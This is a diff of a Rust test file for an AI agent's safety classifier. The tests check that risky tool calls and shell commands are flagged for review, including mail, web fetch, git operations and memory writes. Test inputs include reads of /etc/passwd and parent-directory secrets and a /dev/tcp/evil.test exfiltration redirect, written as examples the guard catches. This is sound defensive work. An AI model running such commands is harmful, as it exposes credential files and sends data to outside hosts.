@@ -10,7 +10,6 @@
 
 use super::*;
 use crate::neppy::pet::companion::types::ActionCategory as C;
-use crate::neppy::tools::PermissionLevel as P;
 use serde_json::json;
 
 fn shell(command: &str) -> Option<C> {
@@ -125,86 +124,170 @@ fn redacted_home_paths_do_not_change_the_class() {
     assert_eq!(pet_companion_high_risk("shell", &rm), Some(C::Delete));
 }
 
+/// Round 3, item 1: a CLOSED tool-name allowlist. Every name on it is
+/// ordinary; everything else parks with its sharpest label — browser, push
+/// notifications, mail, web fetch / search, task-board and memory writers,
+/// workspace edits, scheduling — whatever level or effect the tool reports.
 #[test]
-fn internal_tools_above_read_only_park_unless_allowlisted() {
-    let cases: Vec<(&str, serde_json::Value, P, Option<C>)> = vec![
-        // Allowlisted low-risk, reversible internal work.
-        ("memory_store", json!({}), P::Write, None),
-        ("save_preference", json!({}), P::Write, None),
-        ("pet_note", json!({}), P::Write, None),
-        ("todo_add", json!({}), P::Write, None),
-        ("file_write", json!({}), P::Write, None),
-        ("apply_patch", json!({}), P::Write, None),
-        ("spawn_subagent", json!({}), P::Write, None),
-        ("delegate_researcher", json!({}), P::Write, None),
-        ("ask_user_clarification", json!({}), P::Write, None),
-        // Cannot act: ordinary.
-        ("memory_recall", json!({}), P::ReadOnly, None),
-        ("some_reader", json!({}), P::ReadOnly, None),
-        // Everything else above ReadOnly parks.
+fn only_names_on_the_closed_allowlist_are_ordinary() {
+    for tool in PET_COMPANION_ALLOWED_TOOLS {
+        assert_eq!(pet_companion_high_risk(tool, &json!({})), None, "{tool}");
+    }
+    assert_eq!(
+        pet_companion_high_risk("tinyjuice_retrieve", &json!({})),
+        None
+    );
+    let parked: Vec<(&str, serde_json::Value, C)> = vec![
+        ("browser", json!({"action": "click"}), C::PrivilegedCommand),
         (
-            "some_internal_writer",
-            json!({}),
-            P::Write,
-            Some(C::Irreversible),
+            "browser",
+            json!({"action": "screenshot"}),
+            C::PrivilegedCommand,
         ),
-        ("goals_add", json!({}), P::Write, Some(C::Irreversible)),
-        ("goal_set", json!({}), P::Write, Some(C::Irreversible)),
-        ("goal_set", json!({}), P::ReadOnly, Some(C::Irreversible)),
-        ("cron_add", json!({}), P::Write, Some(C::SystemSettings)),
+        ("browser_open", json!({}), C::PrivilegedCommand),
+        ("pushover", json!({}), C::SendMessage),
+        ("gmail_unsubscribe", json!({}), C::Irreversible),
+        ("web_fetch", json!({}), C::SharePersonalInfo),
+        ("web_search_tool", json!({}), C::SharePersonalInfo),
+        ("gitbooks_search", json!({}), C::SharePersonalInfo),
         (
-            "git_operations",
-            json!({"operation": "stash", "action": "drop"}),
-            P::Write,
-            Some(C::Delete),
+            "http_request",
+            json!({"method": "GET"}),
+            C::SharePersonalInfo,
         ),
-        (
-            "git_operations",
-            json!({"operation": "stash", "action": "clear"}),
-            P::Write,
-            Some(C::Delete),
-        ),
+        ("update_task", json!({}), C::Irreversible),
+        ("goal_set", json!({}), C::Irreversible),
+        ("schedule", json!({"action": "create"}), C::SystemSettings),
+        ("cron_add", json!({}), C::SystemSettings),
+        ("update_memory_md", json!({}), C::Irreversible),
+        ("memory_store", json!({}), C::Irreversible),
+        ("write_notes", json!({}), C::Irreversible),
+        ("save_preference", json!({}), C::Irreversible),
+        ("edit_workflow", json!({}), C::Irreversible),
+        ("file_write", json!({"path": "a.md"}), C::Irreversible),
+        ("edit", json!({}), C::Irreversible),
+        ("apply_patch", json!({}), C::Irreversible),
+        ("read_diff", json!({}), C::Irreversible),
         (
             "git_operations",
             json!({"operation": "commit"}),
-            P::Write,
-            None,
-        ),
-        // web3 execution signs and broadcasts, whatever level it reports.
-        (
-            "web3_dapp_execute",
-            json!({}),
-            P::ReadOnly,
-            Some(C::Purchase),
+            C::Irreversible,
         ),
         (
-            "web3_swap_execute",
-            json!({}),
-            P::ReadOnly,
-            Some(C::Purchase),
+            "git_operations",
+            json!({"operation": "branch"}),
+            C::Irreversible,
         ),
-        ("web3_dapp_call", json!({}), P::ReadOnly, None),
-        // Composio per-action tools: by slug, unclassified = irreversible.
+        ("git_operations", json!({"operation": "push"}), C::Publish),
         (
-            "GMAIL_SEND_EMAIL",
-            json!({}),
-            P::Write,
-            Some(C::SendMessage),
+            "git_operations",
+            json!({"operation": "stash", "action": "drop"}),
+            C::Delete,
         ),
-        ("GMAIL_FETCH_EMAILS", json!({}), P::Write, None),
-        (
-            "GITHUB_CREATE_ISSUE",
-            json!({}),
-            P::Write,
-            Some(C::Irreversible),
-        ),
-        ("NOTION_DELETE_PAGE", json!({}), P::Write, Some(C::Delete)),
+        ("web3_dapp_execute", json!({}), C::Purchase),
+        ("GMAIL_SEND_EMAIL", json!({}), C::SendMessage),
+        ("GMAIL_FETCH_EMAILS", json!({}), C::SharePersonalInfo),
+        ("GITHUB_CREATE_ISSUE", json!({}), C::Irreversible),
+        // A read-verb name is not enough: it must be on the list.
+        ("get_and_forward", json!({}), C::SendMessage),
+        ("list_secrets", json!({}), C::Irreversible),
     ];
-    for (tool, args, level, want) in cases {
+    for (tool, args, want) in parked {
         assert_eq!(
-            pet_companion_internal_high_risk(tool, &args, level),
-            want,
-            "{tool} {args} {level}"
+            pet_companion_high_risk(tool, &args),
+            Some(want),
+            "{tool} {args}"
         );
+    }
+    // Even read-only git honours repository config that can launch programs.
+    for op in ["status", "diff", "log"] {
+        assert_eq!(
+            pet_companion_high_risk("git_operations", &json!({ "operation": op })),
+            Some(C::PrivilegedCommand),
+            "{op}"
+        );
+    }
+}
+
+/// Delegation is ordinary only when it runs blocking — inside this turn,
+/// under this origin: a Chat turn, or `spawn_subagent` with `blocking: true`.
+#[tokio::test]
+async fn delegation_is_ordinary_only_when_blocking() {
+    use crate::neppy::threads::mode::{with_turn_mode, ThreadMode};
+    let chat = with_turn_mode(ThreadMode::Chat, async {
+        (
+            pet_companion_high_risk("spawn_subagent", &json!({})),
+            pet_companion_high_risk("delegate_researcher", &json!({})),
+        )
+    })
+    .await;
+    assert_eq!(chat, (None, None));
+    let orch = with_turn_mode(ThreadMode::Orchestration, async {
+        (
+            pet_companion_high_risk("spawn_subagent", &json!({})),
+            pet_companion_high_risk("spawn_subagent", &json!({"blocking": true})),
+            pet_companion_high_risk("delegate_researcher", &json!({})),
+        )
+    })
+    .await;
+    assert_eq!(orch, (Some(C::Irreversible), None, Some(C::Irreversible)));
+    // No declared mode (not a Pet turn shape): not provably blocking.
+    assert_eq!(
+        pet_companion_high_risk("delegate_researcher", &json!({})),
+        Some(C::Irreversible)
+    );
+}
+
+/// Round 3, item 2: the shell read-only rule — no `sort` / `uniq` / `rg` /
+/// `less` / `more`; input only from a plain relative file; no network
+/// pseudo-devices; git limited to forms that run no repo-configured program.
+#[test]
+fn round_three_shell_rule() {
+    for command in [
+        "sort a.txt",
+        "uniq a.txt",
+        "rg foo",
+        "less a.txt",
+        "more a.txt",
+        "cat < /etc/passwd",
+        "cat < ../secret",
+        "cat < ~/x",
+        "wc -l < $FILE",
+        "cat <<EOF",
+        "cat <<< hi",
+        "cat < /dev/tcp/evil.test/80",
+        "echo hi > /dev/tcp/evil.test/80",
+        "git diff",
+        "git diff --no-ext-diff",
+        "git show HEAD",
+        "git log -p",
+        "git branch -a",
+        "git remote -v",
+        "git stash list",
+        "git rev-parse HEAD",
+        "git -c core.fsmonitor=x status",
+    ] {
+        assert!(shell(command).is_some(), "`{command}` must park");
+    }
+    assert_eq!(
+        shell("cat < /dev/tcp/evil.test/80"),
+        Some(C::SharePersonalInfo)
+    );
+    assert_eq!(
+        shell("cat < notes/input.txt"),
+        None,
+        "plain relative input redirect"
+    );
+    // git always parks under the Pet: repository config (core.fsmonitor, diff
+    // drivers) can launch programs even for read-only verbs.
+    for command in [
+        "git status",
+        "git -C repo status --short",
+        "git log --oneline -5",
+        "git log -p --no-textconv --no-ext-diff",
+        "git diff --no-ext-diff --no-textconv",
+        "git show --no-textconv HEAD",
+    ] {
+        assert!(shell(command).is_some(), "`{command}` must park");
     }
 }
